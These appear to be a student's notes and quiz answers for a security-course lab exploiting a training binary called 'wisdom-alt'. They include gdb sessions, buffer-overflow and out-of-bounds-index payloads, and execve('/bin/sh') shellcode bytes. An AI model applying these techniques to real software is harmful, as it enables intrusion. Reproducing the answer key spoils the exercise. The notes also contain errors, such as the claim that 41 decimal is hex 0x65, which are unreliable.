@@ -1,0 +1,306 @@
+Compile source like this:
+gcc -fno-stack-protector -ggdb -m32 wisdom-alt.c -o wisdom-alt
+
+Enter ascii to the program as \x41\x41
+41 decimal is hex 0x65 which is ASCII Character A.  This
+input for wisdom gives AA as the wisdom string.
+
+The hex address 0xabcdef00 would be entered as individual bytes
+in reverse order \x00\xef\xcd\xab
+
+runbin will do this.
+
+The runbin.sh uses little endian.  
+address 0xabcdef00
+enter like \x00\xef\xcd\xab
+
+
+
+
+
+Buffers
+global _WisdomList *head = NULL;
+global fptr ptrs[3]; is a function pointer
+local char buf[1024]; is a char buffer
+local fptr p = pat_on_back; is a function pointer
+There are local stack based buffers in the routines as well:
+void get_wisdom() {
+	char buf[] = "no wisdom\n";
+	..
+}
+void put_wisdom() {
+	char wis[DATA_SIZE] = {0};
+	...
+}
+
+
+
+
+
+The text walks us through the non-stack based overflow buffer vulnerability.
+It does less "hand holding" of the stack-allocated buffer
+
+ON THE FIRST EXPLOIT
+
+Checkpont that &r is 0xbfff f530
+
+print (int*)&s-(int*)
+258
+
+How to set a register to a certain value
+(gdb) set var $eax = 42
+
+Cmd form is: 
+mov src, dst
+
+ptrs is at address 0x0804 a0d4
+ptrs[s] is determined by:
+(gdb) print /x 0x804a0d4+s*4
+$26 = 0xbffff170
+
+THIS IS AN ERROR. I'm not sure why.
+(gdb) print (int*)&buf+64
+$20 = (int *) 0xbffff230
+
+THIS APPEARS CORRECT
+(gdb) print /x &buf   
+$8 = 0xbffff130
+(gdb) print /x 0xbffff130+64
+$10 = 0xbffff170
+
+
+If I enter 1 for selection:
+(ahh, here buf is pointer to byte)
+(gdb) print /x &buf+64
+$5 = 0xc000f130
+(ahh, here buf is pointer to 4-byte)
+(gdb) print /x (int *) &buf+64
+$6 = 0xbffff230
+
+Using this input
+771675175\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xEE\xEE\xEE\xEE
+Will cause this 
+(gdb) print /x buf[64]
+$3 = 0xee
+(gdb) print /x buf[65]
+$4 = 0xee
+(gdb) print /x buf[66]
+$5 = 0xee
+(gdb) print /x buf[67]
+$6 = 0xee
+
+Which will prompt the call *%eax to attempt to call 0xeeee eeee
+
+What do you replace \xEE\xEE\xEE\xEE with to call write_secret?
+(gdb) print &write_secret
+$7 = (void (*)(void)) 0x8048534 <write_secret>
+
+771675175\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x08
+
+Now how to overwrite wis variable so that you overwrite return address
+and execute the write_secret function.
+
+The wis buffer is 128 bytes.
+128 A's
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+This will overwrite and attempt to fix up edi and esi
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\xbf\xff\xf5\x30\xbf\xff\xf5\x48\x34\x85\x04\x08
+
+
+This is sufficient to see the secret key though. Above and this one still 
+crash.
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDAABBCCDD\x34\x85\x04\x08
+
+
+
+
+
+
+
+
+
+
+
+
+771675175 == 0x2dfed427 = 2dfe d427
+
+(gdb) i f
+prints the stack frame
+
+print contents of register
+(gdb) info registers eax
+(gdb) display /x $eax
+
+print disassemble of memory pointed to by pc
+display /i $pc
+
+print disassemble of memory pointed to by ebp
+display /i $ebp
+
+disassemble memory 
+display /i 0x12345678
+
+771675175\x00\x00\x00AAAA\x2f\x62\x69\x6e\x2f\x73\x68\x00\x40\xf1\xff\xbf\x00\x00\x00\x00\xbb\x40\xf1\xff\xbf\xb9\x48\xf1\xff\xbf\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAA\x50\xf1\xff\xbf
+
+Enter this to the prompt Selection>
+<ptrs_index_num>...<func_address><machine code>
+ptrs_index_num is such that addressing ptrs[ptr_index_num] would point to the locaiton of <func_address>.
+
+<func_address> is really just the address where <machine code> would live
+And since <machine code is invoked as a function call (lines 101/2 of .c)
+
+
+771675175\x00\x00\x00AAAA\x2f\x62\x69\x6e\x2f\x73\x68\x00\x40\xf1\xff\xbf\x00\x00\x00\x00\xbb\x40\xf1\xff\xbf\xb9\x48\xf1\xff\xbf\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAA\x50\xf1\xff\xbf
+
+
+buf is at address  0xbff f130
+0xbffff130: 771675175\x00 This is the address of buf. 
+0xbffff140: 2f62696922f736800 (which is the hex for /bin/sh as ascii, 
+followed by a null terminator)
+0xbffff148: 40f1ffbf (which is the address of where the /bin/sh string starts corrected for endanness)
+0xbfff150: the shell code (see below)
+0xbffff170: 50f1ffbf (which is the address that ends up being in 
+the tmp variable, ie. will cause the shell code to be called. This buf[64])
+
+
+
+
+
+The shell code in here (remember quick and dirty) is the bytes corresponding
+the following assembly:
+
+<- 1st arg for execve (the address of the string /bin/sh, to be used 
+as the executable path)
+0xbffff150   mov long ebx, 0xbffff140 
+
+< - 2nd arg for execve (pointer to the address of an array that in our 
+case contains /bin/sh)
+0xbffff??? mov long ecx, 0xbffff148 
+
+<- null value for 3rd argument
+0xbffff??? mov edx,0x0
+
+<- the number of the system call, 0xb for execve
+0xbffff??? mov eax, 0xb
+
+<- execute the system call
+0xbffff??? int 0x80              
+
+
+ihat is the address of buf?
+0xbfff f130
+
+What is the address of ptrs?
+0x0804 a0d4
+
+What is the address of write_secret?
+0x0804 8534
+
+what is the address of p local to main?
+0xbfff f534
+
+What input do you provide so that ptrs[s] reads/executes
+the contents of variable p instead of function in ptrs buffer?
+If ok, you will execute pat_on_back function. Enter your answer
+as an unsigned integer.
+
+(p-ptrs)/4 is
+print /x (0xbffff534 - 0x804a0d4)/4
+0x2dfed518 or 771675416
+
+What do you enter so that ptrs[s] reads (and then tries to execute) 
+starting from the 65th byte in buf, ie. the location at buf[64]? 
+Enter your answer as an unsiged integer.
+
+
+
+=====================================
+
+QUESTIONS
+
+1. There is a stack-based overflow in the program. 
+What is the name of the stack-allocated variable that contains 
+the overflowed buffer?
+
+ans: wis
+
+2.  Consider the buffer you just identified: 
+Running what line of code will overflow the buffer?
+
+ans: 62 
+
+3.  There is another vulnerability, not dependent at all on the first, 
+involving a non-stack allocated buffer that can be indexed outside 
+its bounds. What variable contains this buffer?
+
+ans: ptrs
+
+4.  Consider the buffer you just identified: Running what line of code overflows the buffer?
+
+ans: 101
+
+5. What is the address of buf?
+
+ans: 0xbfff f130
+
+6. What is the address of ptrs?
+ans: 0x0804 a0d4
+
+7, What is the address of write_secret?
+ans: 0x0804 8534
+
+8. what is the address of p local to main?
+ans: 0xbfff f534
+
+9. What input do you provide so that ptrs[s] reads/executes
+the contents of variable p instead of function in ptrs buffer?
+If ok, you will execute pat_on_back function. Enter your answer
+as an unsigned integer.
+
+ans:
+(p-ptrs)/4 is
+print /x (0xbffff534 - 0x804a0d4)/4
+0x2dfed518 or 771675416
+
+10. What do you enter so that ptrs[s] reads (and then tries to execute) 
+starting from the 65th byte in buf, ie. the location at buf[64]? 
+Enter your answer as an unsiged integer.
+
+ans:
+(gdb) print /x &buf[64]
+$6 = 0xbffff170
+(gdb) print /d  (int*)&buf[64]-(int *)&ptrs
+$14 = 771675175
+771675175
+
+
+11. What do you replace \xEE\xEE\xEE\xEE with to call write_secret?
+
+ans:
+
+(gdb) print &write_secret
+$7 = (void (*)(void)) 0x8048534 <write_secret>
+
+771675175\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x08
+
+12 How many bytes do you need to enter prior to the address of write_secret?
+Each A is a byte.
+This line is 16 bytes long
+1  AAAAAAAAAAAAAAAA
+2  AAAAAAAAAAAAAAAA
+3  AAAAAAAAAAAAAAAA
+4  AAAAAAAAAAAAAAAA
+5  AAAAAAAAAAAAAAAA
+6  AAAAAAAAAAAAAAAA
+7  AAAAAAAAAAAAAAAA
+8  AAAAAAAAAAAAAAAA
+9  BBBBCCCCDDDDAABB
+   CCDD
+   \x34\x85\x04\x08
+
+Bytes = 9*16 + 4 = 144 + 4 = 148
+
+ans: 148
+
+
